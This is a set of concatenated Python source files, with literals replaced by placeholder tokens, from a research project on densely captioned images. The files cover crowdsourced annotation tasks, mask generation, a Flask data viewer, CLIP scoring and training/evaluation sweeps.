<s> from setuptools import setup , find_namespace_packages <EOL> import sys <EOL> with open ( "<STR_LIT>" ) as f : <EOL> reqs = f . read ( ) <EOL> if __name__ == "<STR_LIT>" : <EOL> setup ( <EOL> name = "<STR_LIT>" , <EOL> version = "<STR_LIT>" , <EOL> description = "<STR_LIT>" , <EOL> python_requires = "<STR_LIT>" , <EOL> packages = find_namespace_packages ( include = [ '<STR_LIT>' ] ) , <EOL> install_requires = reqs . strip ( ) . split ( "<STR_LIT>" ) , <EOL> classifiers = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ) <EOL> </s>
<s> from mephisto . abstractions . databases . local_database import LocalMephistoDB <EOL> from mephisto . tools . data_browser import DataBrowser <EOL> from tqdm import tqdm <EOL> import os <EOL> import shutil <EOL> import json <EOL> from densely_captioned_images . dataset . config import DATASET_PHOTO_PATH , DATASET_ANNOTATIONS_PATH <EOL> TARGET_TASKS = [ <EOL> '<STR_LIT>' <EOL> ] <EOL> ASSET_PATH = os . path . join ( os . path . dirname ( __file__ ) , '<STR_LIT>' ) <EOL> def extract_final_data ( m_data ) : <EOL> inputs = m_data [ '<STR_LIT>' ] <EOL> outputs = m_data [ '<STR_LIT>' ] <EOL> reconstructed_masks = inputs [ '<STR_LIT>' ] <EOL> for mask_key in reconstructed_masks . keys ( ) : <EOL> reconstructed_masks [ mask_key ] . update ( outputs [ '<STR_LIT>' ] [ mask_key ] ) <EOL> return { <EOL> '<STR_LIT>' : outputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : outputs [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : inputs [ '<STR_LIT>' ] [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : reconstructed_masks , <EOL> '<STR_LIT>' : list ( outputs [ '<STR_LIT>' ] . keys ( ) ) , <EOL> } <EOL> def main ( ) : <EOL> db = LocalMephistoDB ( ) <EOL> browser = DataBrowser ( db ) <EOL> approved_units = [ ] <EOL> print ( "<STR_LIT>" ) <EOL> for target in TARGET_TASKS : <EOL> print ( f"<STR_LIT>" , end = "<STR_LIT>" , flush = True ) <EOL> units = browser . get_units_for_task_name ( target ) <EOL> print ( f"<STR_LIT>" , end = "<STR_LIT>" , flush = True ) <EOL> units = [ u for u in units if u . get_assigned_agent ( ) is not None and u . get_assigned_agent ( ) . get_status ( ) == '<STR_LIT>' ] <EOL> print ( f"<STR_LIT>" , flush = True ) <EOL> approved_units += units <EOL> print ( f"<STR_LIT>" ) <EOL> for u in tqdm ( approved_units ) : <EOL> try : <EOL> data = u . get_assigned_agent ( ) . state . get_data ( ) <EOL> formatted = extract_final_data ( data ) <EOL> source_image_path = os . path . join ( ASSET_PATH , formatted [ '<STR_LIT>' ] ) <EOL> target_image_path = os . path . join ( DATASET_PHOTO_PATH , formatted [ '<STR_LIT>' ] ) <EOL> output_data_path = os . path . join ( DATASET_ANNOTATIONS_PATH , f"<STR_LIT>" ) <EOL> shutil . copy2 ( source_image_path , target_image_path ) <EOL> with open ( output_data_path , '<STR_LIT>' ) as output_file : <EOL> json . dump ( formatted , output_file ) <EOL> except OSError : <EOL> print ( f"<STR_LIT>" ) <EOL> continue <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
<s> from densely_captioned_images . repro . eval . run_full_evals import CLIPEvalConfig , CLIPEvalJob <EOL> from densely_captioned_images . repro . config import MODEL_PATH , DENSE_CAPS_DIR <EOL> import submitit <EOL> import os <EOL> def main ( ) : <EOL> with open ( os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) ) as f : <EOL> MODEL_FILES = [ <EOL> os . path . join ( MODEL_PATH , m . strip ( ) ) <EOL> for m in f . readlines ( ) <EOL> ] <EOL> print ( "<STR_LIT>" , len ( MODEL_FILES ) ) <EOL> eval_sweep = [ <EOL> CLIPEvalConfig ( <EOL> run_aro = True , <EOL> run_vlc = True , <EOL> run_dense_cap = True , <EOL> run_winoground = True , <EOL> run_elevater = - <NUM_LIT> , <EOL> lora_weight_location = model_path , <EOL> model_name = model_path . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> ) for model_path in MODEL_FILES <EOL> ] <EOL> log_base_folder = os . path . join ( MODEL_PATH , '<STR_LIT>' , f"<STR_LIT>" ) <EOL> os . makedirs ( log_base_folder , exist_ok = True ) <EOL> log_folder = f"<STR_LIT>" <EOL> executor = submitit . AutoExecutor ( folder = log_folder ) <EOL> executor . update_parameters ( <EOL> slurm_partition = '<STR_LIT>' , <EOL> nodes = <NUM_LIT> , <EOL> timeout_min = <NUM_LIT> * <NUM_LIT> , <EOL> tasks_per_node = <NUM_LIT> , <EOL> gpus_per_node = <NUM_LIT> , <EOL> cpus_per_task = <NUM_LIT> , <EOL> slurm_mem = '<STR_LIT>' , <EOL> ) <EOL> job_array = [ ] <EOL> for sweep_args in eval_sweep : <EOL> job = executor . submit ( CLIPEvalJob ( ) , sweep_args ) <EOL> job_array . append ( job ) <EOL> print ( f"<STR_LIT>" ) <EOL> for job in job_array : <EOL> _ = job . result ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
<s> from mephisto . operations . operator import Operator <EOL> from mephisto . tools . scripts import ( <EOL> task_script , <EOL> build_custom_bundle , <EOL> ) <EOL> from mephisto . abstractions . blueprints . abstract . static_task . static_blueprint import ( <EOL> SharedStaticTaskState , <EOL> ) <EOL> from omegaconf import DictConfig <EOL> from dataclasses import dataclass , field <EOL> import cv2 <EOL> import base64 <EOL> import random <EOL> from PIL import Image <EOL> from mephisto . data_model . qualification import QUAL_NOT_EXIST , QUAL_EXISTS <EOL> from mephisto . utils . qualifications import make_qualification_dict <EOL> from mephisto . operations . hydra_config import build_default_task_config <EOL> from typing import Any , Dict , List , Optional <EOL> import os <EOL> import json <EOL> AREA_CUTOFF = <NUM_LIT> <EOL> NUM_TASKS = <NUM_LIT> <EOL> LOW = <NUM_LIT> <EOL> HIGH = <NUM_LIT> <EOL> BASE_SOURCE_PATH = os . path . expanduser ( "<STR_LIT>" ) <EOL> BASE_IMAGE_PATH = os . path . join ( BASE_SOURCE_PATH , '<STR_LIT>' ) <EOL> BASE_MASK_PATH = os . path . join ( BASE_SOURCE_PATH , '<STR_LIT>' ) <EOL> PILOT_QUALIFICATION = '<STR_LIT>' <EOL> ALLOWLIST_QUALIFICATION = '<STR_LIT>' <EOL> @ dataclass <EOL> class LongCapsConfig ( build_default_task_config ( "<STR_LIT>" ) ) : <EOL> idx_start : int = field ( <EOL> default = LOW , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> idx_end : int = field ( <EOL> default = HIGH , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> is_pilot : Optional [ bool ] = field ( <EOL> default = None , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> def build_tasks ( num_tasks , lo , hi ) : <EOL> tasks = [ ] <EOL> all_masks = os . listdir ( BASE_MASK_PATH ) <EOL> use_masks = all_masks [ lo : hi ] <EOL> idx = <NUM_LIT> <EOL> while idx < len ( use_masks ) and len ( tasks ) < num_tasks : <EOL> mask_name = use_masks [ idx ] <EOL> idx += <NUM_LIT> <EOL> img_name = mask_name [ : - len ( '<STR_LIT>' ) ] <EOL> image_path = os . path . join ( BASE_IMAGE_PATH , img_name ) <EOL> with open ( image_path , "<STR_LIT>" ) as img_file : <EOL> b64_image = base64 . b64encode ( img_file . read ( ) ) <EOL> image = cv2 . imread ( image_path ) <EOL> image = cv2 . cvtColor ( image , cv2 . COLOR_BGR2RGB ) <EOL> mask_path = os . path . join ( BASE_MASK_PATH , mask_name ) <EOL> try : <EOL> with open ( mask_path , '<STR_LIT>' ) as mask_file : <EOL> mask_data = json . load ( mask_file ) <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" , e ) <EOL> continue <EOL> masks_unrolled = { } <EOL> curr_idx = <NUM_LIT> <EOL> def unroll_mask_into ( curr_mask_layer , target ) : <EOL> nonlocal curr_idx <EOL> curr_mask_layer [ '<STR_LIT>' ] = curr_idx <EOL> curr_idx += <NUM_LIT> <EOL> if curr_mask_layer [ '<STR_LIT>' ] < AREA_CUTOFF : <EOL> return <EOL> curr_mask_layer [ '<STR_LIT>' ] = [ ] <EOL> curr_mask_layer [ '<STR_LIT>' ] = - <NUM_LIT> <EOL> for deeper_mask_layer in sorted ( <EOL> list ( curr_mask_layer [ '<STR_LIT>' ] . values ( ) ) , <EOL> key = lambda x : x [ '<STR_LIT>' ] [ <NUM_LIT> ] [ <NUM_LIT> ] * <NUM_LIT> + x [ '<STR_LIT>' ] [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> ) : <EOL> unroll_mask_into ( deeper_mask_layer , target ) <EOL> deeper_mask_layer [ '<STR_LIT>' ] = curr_mask_layer [ '<STR_LIT>' ] <EOL> curr_mask_layer [ '<STR_LIT>' ] . append ( deeper_mask_layer [ '<STR_LIT>' ] ) <EOL> del curr_mask_layer [ '<STR_LIT>' ] <EOL> target [ curr_mask_layer [ '<STR_LIT>' ] ] = curr_mask_layer <EOL> ( top , left ) , ( bottom , right ) = curr_mask_layer [ '<STR_LIT>' ] <EOL> assert top < bottom and left < right , "<STR_LIT>" <EOL> curr_mask_layer [ '<STR_LIT>' ] = { '<STR_LIT>' : { '<STR_LIT>' : left , '<STR_LIT>' : top } , '<STR_LIT>' : { '<STR_LIT>' : right , '<STR_LIT>' : bottom } } <EOL> curr_mask_layer [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> curr_mask_layer [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> curr_mask_layer [ '<STR_LIT>' ] = <NUM_LIT> <EOL> try : <EOL> for entry in mask_data . values ( ) : <EOL> unroll_mask_into ( entry , masks_unrolled ) <EOL> except AssertionError : <EOL> continue <EOL> image_data = { <EOL> "<STR_LIT>" : "<STR_LIT>" + b64_image . decode ( '<STR_LIT>' ) , <EOL> "<STR_LIT>" : image . shape [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : image . shape [ <NUM_LIT> ] , <EOL> } <EOL> tasks . append ( <EOL> { <EOL> "<STR_LIT>" : mask_name , <EOL> "<STR_LIT>" : masks_unrolled , <EOL> "<STR_LIT>" : image_data , <EOL> } <EOL> ) <EOL> print ( len ( tasks ) , len ( all_masks ) , len ( use_masks ) ) <EOL> return tasks <EOL> @ task_script ( config = LongCapsConfig ) <EOL> def main ( operator : Operator , cfg : DictConfig ) -> None : <EOL> shared_state = SharedStaticTaskState ( <EOL> static_task_data = build_tasks ( cfg . num_tasks , cfg . idx_start , cfg . idx_end ) , <EOL> ) <EOL> if cfg . is_pilot is True : <EOL> shared_state . qualifications = [ <EOL> make_qualification_dict ( <EOL> PILOT_QUALIFICATION , <EOL> QUAL_EXISTS , <EOL> None , <EOL> ) , <EOL> make_qualification_dict ( <EOL> ALLOWLIST_QUALIFICATION , <EOL> QUAL_NOT_EXIST , <EOL> None , <EOL> ) , <EOL> ] <EOL> elif cfg . is_pilot is False : <EOL> shared_state . qualifications = [ <EOL> make_qualification_dict ( <EOL> ALLOWLIST_QUALIFICATION , <EOL> QUAL_EXISTS , <EOL> None , <EOL> ) , <EOL> ] <EOL> task_dir = cfg . task_dir <EOL> build_custom_bundle ( <EOL> task_dir , <EOL> force_rebuild = cfg . mephisto . task . force_rebuild , <EOL> ) <EOL> operator . launch_task_run ( cfg . mephisto , shared_state ) <EOL> operator . wait_for_runs_then_shutdown ( skip_input = True , log_rate = <NUM_LIT> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> from flask import Flask , send_from_directory , jsonify , redirect <EOL> from PIL import Image <EOL> import json <EOL> import base64 <EOL> import io <EOL> import os <EOL> import sys <EOL> from densely_captioned_images . dataset . config import DATASET_PHOTO_PATH , DATASET_ANNOTATIONS_PATH <EOL> ENTRIES = os . listdir ( DATASET_ANNOTATIONS_PATH ) <EOL> ENTRIES_MAP = { str ( i ) : e for i , e in enumerate ( ENTRIES ) } <EOL> ENTRIES_REVERSE_MAP = { str ( e ) : i for i , e in enumerate ( ENTRIES ) } <EOL> app = Flask ( __name__ , static_folder = '<STR_LIT>' ) <EOL> def extract_data ( entry_key ) : <EOL> print ( entry_key ) <EOL> if entry_key in ENTRIES_MAP : <EOL> entry_key = ENTRIES_MAP [ entry_key ] <EOL> assert entry_key in ENTRIES_REVERSE_MAP <EOL> total_entries = len ( ENTRIES_REVERSE_MAP ) <EOL> next = ( ENTRIES_REVERSE_MAP [ entry_key ] + <NUM_LIT> ) % total_entries <EOL> next = ENTRIES_MAP [ str ( next ) ] <EOL> prev = ( ENTRIES_REVERSE_MAP [ entry_key ] - <NUM_LIT> ) % total_entries <EOL> prev = ENTRIES_MAP [ str ( prev ) ] <EOL> with open ( os . path . join ( DATASET_ANNOTATIONS_PATH , entry_key ) ) as entry_file : <EOL> base_data = json . load ( entry_file ) <EOL> img = Image . open ( os . path . join ( DATASET_PHOTO_PATH , base_data [ '<STR_LIT>' ] ) ) <EOL> width , height = img . size <EOL> base_data [ '<STR_LIT>' ] = width <EOL> base_data [ '<STR_LIT>' ] = height <EOL> buffered = io . BytesIO ( ) <EOL> img . save ( buffered , format = "<STR_LIT>" ) <EOL> img_str = base64 . b64encode ( buffered . getvalue ( ) ) . decode ( ) <EOL> base_data [ '<STR_LIT>' ] = "<STR_LIT>" + img_str <EOL> return jsonify ( { <EOL> '<STR_LIT>' : base_data , <EOL> '<STR_LIT>' : next , <EOL> '<STR_LIT>' : prev , <EOL> '<STR_LIT>' : entry_key , <EOL> } ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def get_data_path ( path ) : <EOL> try : <EOL> return extract_data ( path ) <EOL> except Exception as e : <EOL> raise e <EOL> @ app . route ( '<STR_LIT>' , defaults = { '<STR_LIT>' : None } ) <EOL> def get_data ( path ) : <EOL> return extract_data ( <NUM_LIT> ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def serve_js ( ) : <EOL> return send_from_directory ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def serve_html ( ) : <EOL> return redirect ( "<STR_LIT>" ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def catch_all ( path ) : <EOL> return send_from_directory ( app . static_folder , '<STR_LIT>' ) <EOL> if __name__ == '<STR_LIT>' : <EOL> if len ( sys . argv ) > <NUM_LIT> : <EOL> print ( f'<STR_LIT>' ) <EOL> sys . exit ( ) <EOL> if len ( sys . argv ) > <NUM_LIT> : <EOL> port = int ( sys . argv [ <NUM_LIT> ] ) <EOL> else : <EOL> port = <NUM_LIT> <EOL> app . run ( debug = True , port = port ) <EOL> </s>
<s> import time <EOL> import sys <EOL> from segment_anything import sam_model_registry , SamPredictor <EOL> from . mask_creation_utils import compute_group_tree , FinalGrouping , FinalGroup <EOL> from PIL import Image <EOL> import numpy as np <EOL> import os <EOL> import base64 <EOL> from io import BytesIO <EOL> import cv2 <EOL> import json <EOL> LOW = <NUM_LIT> <EOL> HIGH = <NUM_LIT> <EOL> SETEV_MODEL_ROOT = '<STR_LIT>' <EOL> ANNOTATE_ROOT = os . path . dirname ( os . path . dirname ( __file__ ) ) <EOL> SOURCE_DIR = os . path . join ( ANNOTATE_ROOT , "<STR_LIT>" ) <EOL> OUT_DIR = os . path . join ( ANNOTATE_ROOT , "<STR_LIT>" ) <EOL> def fold_group_tree ( g : FinalGrouping ) : <EOL> def fold_group ( subg : FinalGroup ) : <EOL> outer_mask = subg [ '<STR_LIT>' ] <EOL> mask_img = Image . fromarray ( np . uint8 ( outer_mask . mask * <NUM_LIT> ) ) <EOL> mask_img = mask_img . convert ( '<STR_LIT>' ) <EOL> maskbuf = BytesIO ( ) <EOL> mask_img . save ( maskbuf , format = '<STR_LIT>' , bits = <NUM_LIT> , optimize = True ) <EOL> mask_bytes = maskbuf . getvalue ( ) <EOL> as_base64 = base64 . b64encode ( mask_bytes ) <EOL> as_str = as_base64 . decode ( '<STR_LIT>' ) <EOL> ( t , l ) , ( b , r ) = subg [ '<STR_LIT>' ] . get_tlbr ( ) <EOL> return { <EOL> '<STR_LIT>' : as_str , <EOL> '<STR_LIT>' : outer_mask . get_size ( ) , <EOL> '<STR_LIT>' : ( ( int ( t ) , int ( l ) ) , ( int ( b ) , int ( r ) ) ) , <EOL> '<STR_LIT>' : { <EOL> idx : fold_group ( subsubg ) for ( idx , subsubg ) in subg [ '<STR_LIT>' ] . items ( ) <EOL> } <EOL> } <EOL> return { <EOL> idx : fold_group ( subg ) for ( idx , subg ) in g . items ( ) <EOL> } <EOL> def main ( ) : <EOL> all_images = os . listdir ( SOURCE_DIR ) <EOL> target_images = all_images [ LOW : HIGH ] <EOL> sam_checkpoint = SETEV_MODEL_ROOT <EOL> model_type = "<STR_LIT>" <EOL> device = "<STR_LIT>" <EOL> sam = sam_model_registry [ model_type ] ( checkpoint = sam_checkpoint ) <EOL> sam . to ( device = device ) <EOL> predictor = SamPredictor ( sam ) <EOL> for idx , img in enumerate ( target_images ) : <EOL> start_time = time . time ( ) <EOL> path = os . path . join ( SOURCE_DIR , img ) <EOL> img_array = cv2 . imread ( path ) <EOL> img_array = cv2 . cvtColor ( img_array , cv2 . COLOR_BGR2RGB ) <EOL> result = compute_group_tree ( <EOL> predictor , <EOL> img_array , <EOL> score_cutoff = <NUM_LIT> , <EOL> outer_sim_thresh = <NUM_LIT> , <EOL> mutual_sim_thresh = <NUM_LIT> , <EOL> retain_best = False , <EOL> ) <EOL> folded = fold_group_tree ( result ) <EOL> with open ( os . path . join ( OUT_DIR , img + "<STR_LIT>" ) , '<STR_LIT>' ) as json_outf : <EOL> json . dump ( folded , json_outf ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
<s> import os <EOL> import yaml <EOL> DENSE_CAPS_REPRODUCTION_PACKAGE_DIR = os . path . dirname ( os . path . dirname ( os . path . dirname ( __file__ ) ) ) <EOL> DENSE_CAPS_DIR = os . path . dirname ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR ) <EOL> CONFIG_FILE = os . path . join ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR , '<STR_LIT>' ) <EOL> def init_config ( ) : <EOL> config = { '<STR_LIT>' : True } <EOL> print ( "<STR_LIT>" ) <EOL> default_data_dir = os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) <EOL> data_dir = input ( f"<STR_LIT>" ) <EOL> if data_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = default_data_dir <EOL> else : <EOL> config [ '<STR_LIT>' ] = data_dir . strip ( ) <EOL> coco_default = os . path . join ( data_dir , '<STR_LIT>' ) <EOL> coco_dir = input ( f"<STR_LIT>" ) <EOL> if coco_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = coco_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = coco_dir . strip ( ) <EOL> aro_default = os . path . join ( data_dir , '<STR_LIT>' ) <EOL> aro_dir = input ( f"<STR_LIT>" ) <EOL> if aro_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = aro_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = aro_dir . strip ( ) <EOL> vlc_default = os . path . join ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR , '<STR_LIT>' , '<STR_LIT>' ) <EOL> vlc_dir = input ( f"<STR_LIT>" ) <EOL> if vlc_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = vlc_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = vlc_dir . strip ( ) <EOL> ln_default = os . path . join ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR , '<STR_LIT>' , '<STR_LIT>' ) <EOL> ln_dir = input ( f"<STR_LIT>" ) <EOL> if ln_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = ln_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = ln_dir . strip ( ) <EOL> elevater_default = os . path . join ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR , '<STR_LIT>' ) <EOL> elevater_dir = input ( f"<STR_LIT>" ) <EOL> if elevater_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = elevater_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = elevater_dir . strip ( ) <EOL> model_default = os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) <EOL> model_dir = input ( f"<STR_LIT>" ) <EOL> if elevater_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = model_default <EOL> else : <EOL> config [ '<STR_LIT>' ] = model_dir . strip ( ) <EOL> with open ( CONFIG_FILE , '<STR_LIT>' ) as config_file : <EOL> yaml . dump ( config , config_file ) <EOL> return config <EOL> def get_config ( ) : <EOL> if not os . path . exists ( CONFIG_FILE ) : <EOL> return init_config ( ) <EOL> with open ( CONFIG_FILE , '<STR_LIT>' ) as config_file : <EOL> config = yaml . safe_load ( config_file ) <EOL> return config <EOL> DCI_CONFIG = get_config ( ) <EOL> EVAL_DATASET_PATH = DCI_CONFIG [ '<STR_LIT>' ] <EOL> VLC_ROOT_PATH = DCI_CONFIG [ '<STR_LIT>' ] <EOL> COCO_DIR = DCI_CONFIG [ '<STR_LIT>' ] <EOL> ARO_DIR = DCI_CONFIG [ '<STR_LIT>' ] <EOL> MODEL_PATH = DCI_CONFIG [ '<STR_LIT>' ] <EOL> ELEVATER_EVAL_ROOT = DCI_CONFIG [ '<STR_LIT>' ] <EOL> ELEVATER_MODEL_CONFIG = os . path . join ( ELEVATER_EVAL_ROOT , '<STR_LIT>' ) <EOL> ELEVATER_DATASET_CONFIG_ROOT = os . path . join ( ELEVATER_EVAL_ROOT , '<STR_LIT>' ) <EOL> ELEVATER_DATASET_ROOT = os . path . join ( EVAL_DATASET_PATH , '<STR_LIT>' ) <EOL> LOCALIZED_NARRATIVES_DATAPATH = os . path . join ( DCI_CONFIG [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> COCO_TRAIN2017_DATAPATH = os . path . join ( COCO_DIR , '<STR_LIT>' ) <EOL> COCO_TRAIN2017_ANNOTATION_PATH = os . path . join ( COCO_DIR , '<STR_LIT>' ) <EOL> COCO_VALID2017_DATAPATH = os . path . join ( COCO_DIR , '<STR_LIT>' ) <EOL> COCO_VALID2017_ANNOTATION_PATH = os . path . join ( COCO_DIR , '<STR_LIT>' ) <EOL> EVAL_LOG_PATH = os . path . join ( DENSE_CAPS_REPRODUCTION_PACKAGE_DIR , '<STR_LIT>' ) <EOL> </s>
<s> from mephisto . operations . operator import Operator <EOL> from mephisto . tools . scripts import task_script , build_custom_bundle <EOL> from mephisto . data_model . qualification import QUAL_NOT_EXIST , QUAL_EXISTS <EOL> from mephisto . utils . qualifications import make_qualification_dict <EOL> from mephisto . abstractions . blueprints . abstract . static_task . static_blueprint import ( <EOL> SharedStaticTaskState , <EOL> ) <EOL> from omegaconf import DictConfig <EOL> NUM_TASKS = <NUM_LIT> <EOL> PILOT_QUALIFICATION = '<STR_LIT>' <EOL> ALLOWLIST_QUALIFICATION = '<STR_LIT>' <EOL> @ task_script ( default_config_file = "<STR_LIT>" ) <EOL> def main ( operator : Operator , cfg : DictConfig ) -> None : <EOL> shared_state = SharedStaticTaskState ( <EOL> static_task_data = [ { } ] * NUM_TASKS , <EOL> ) <EOL> shared_state . qualifications = [ <EOL> make_qualification_dict ( <EOL> PILOT_QUALIFICATION , <EOL> QUAL_NOT_EXIST , <EOL> None , <EOL> ) , <EOL> make_qualification_dict ( <EOL> ALLOWLIST_QUALIFICATION , <EOL> QUAL_NOT_EXIST , <EOL> None , <EOL> ) , <EOL> ] <EOL> shared_state . mturk_specific_qualifications = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> ] <EOL> task_dir = cfg . task_dir <EOL> build_custom_bundle ( <EOL> task_dir , <EOL> force_rebuild = cfg . mephisto . task . force_rebuild , <EOL> post_install_script = cfg . mephisto . task . post_install_script , <EOL> ) <EOL> operator . launch_task_run ( cfg . mephisto , shared_state ) <EOL> operator . wait_for_runs_then_shutdown ( skip_input = True , log_rate = <NUM_LIT> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> import os <EOL> import json <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> from long_captions . dense_image import DenseCaptionedImage , get_key_for , get_dci_count <EOL> from long_captions . config import DATASET_COMPLETE_PATH <EOL> from tqdm import tqdm <EOL> from typing import Tuple <EOL> clip_processor = None <EOL> clip_model = None <EOL> def get_clip ( ) -> Tuple [ CLIPModel , CLIPProcessor ] : <EOL> global clip_processor , clip_model <EOL> if clip_processor is None : <EOL> clip_processor = CLIPProcessor . from_pretrained ( "<STR_LIT>" ) <EOL> if clip_model is None : <EOL> clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> return clip_model , clip_processor <EOL> def get_clip_scores ( dci : DenseCaptionedImage ) : <EOL> did_nothing = True <EOL> scores = dci . _data . get ( '<STR_LIT>' , { } ) <EOL> summaries = dci . get_summaries ( ) <EOL> negatives = dci . get_negatives ( ) <EOL> mask_exs = [ dci . get_caption_with_subcaptions ( m ) [ <NUM_LIT> ] for m in dci . filter_masks_by_size ( ) ] <EOL> exs = dci . get_formatted_complete_description ( ) + mask_exs <EOL> clip_model , clip_processor = get_clip ( ) <EOL> for ex in exs : <EOL> key = ex [ '<STR_LIT>' ] <EOL> if key in scores : <EOL> continue <EOL> summary = summaries [ key ] <EOL> negs = negatives [ key ] <EOL> subkeys = [ '<STR_LIT>' ] <EOL> texts = [ summary ] <EOL> for neg_type , typed_negs in negs . items ( ) : <EOL> for idx , typed_neg in enumerate ( typed_negs ) : <EOL> texts . append ( typed_neg ) <EOL> subkeys . append ( f"<STR_LIT>" ) <EOL> inputs = clip_processor ( <EOL> text = texts , <EOL> images = [ ex [ '<STR_LIT>' ] ] , <EOL> return_tensors = "<STR_LIT>" , <EOL> padding = True <EOL> ) <EOL> outputs = clip_model ( ** inputs ) <EOL> logits_per_image = outputs . logits_per_image . detach ( ) . cpu ( ) . numpy ( ) [ <NUM_LIT> ] . tolist ( ) <EOL> scores [ key ] = { sk : logit for sk , logit in zip ( subkeys , logits_per_image ) } <EOL> did_nothing = False <EOL> assert not did_nothing <EOL> return scores <EOL> def generate_and_write_clip_scores ( ) : <EOL> count = get_dci_count ( ) <EOL> for i in tqdm ( range ( count ) ) : <EOL> key = get_key_for ( i ) <EOL> source_path = os . path . join ( DATASET_COMPLETE_PATH , key ) <EOL> if not os . path . exists ( source_path ) : <EOL> continue <EOL> dci = DenseCaptionedImage ( i ) <EOL> try : <EOL> clip_scores = get_clip_scores ( dci ) <EOL> except Exception : <EOL> continue <EOL> with open ( source_path ) as jsonf : <EOL> base_data = json . load ( jsonf ) <EOL> base_data [ '<STR_LIT>' ] = clip_scores <EOL> with open ( source_path , '<STR_LIT>' ) as jsonf : <EOL> json . dump ( base_data , jsonf ) <EOL> if __name__ == "<STR_LIT>" : <EOL> generate_and_write_clip_scores ( ) <EOL> </s>
<s> from densely_captioned_images . repro . train . train_clip import CLIPAndNegConfig , CLIPTrainJob , get_dir_name <EOL> from densely_captioned_images . repro . config import MODEL_PATH <EOL> import itertools <EOL> import submitit <EOL> import time <EOL> import os <EOL> def makeGrid ( pars_dict ) : <EOL> keys = pars_dict . keys ( ) <EOL> combinations = itertools . product ( * pars_dict . values ( ) ) <EOL> ds = [ dict ( zip ( keys , cc ) ) for cc in combinations ] <EOL> return ds <EOL> def main ( ) : <EOL> base_only_sweep = { <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ False ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> } <EOL> base_only_baselines = { <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ 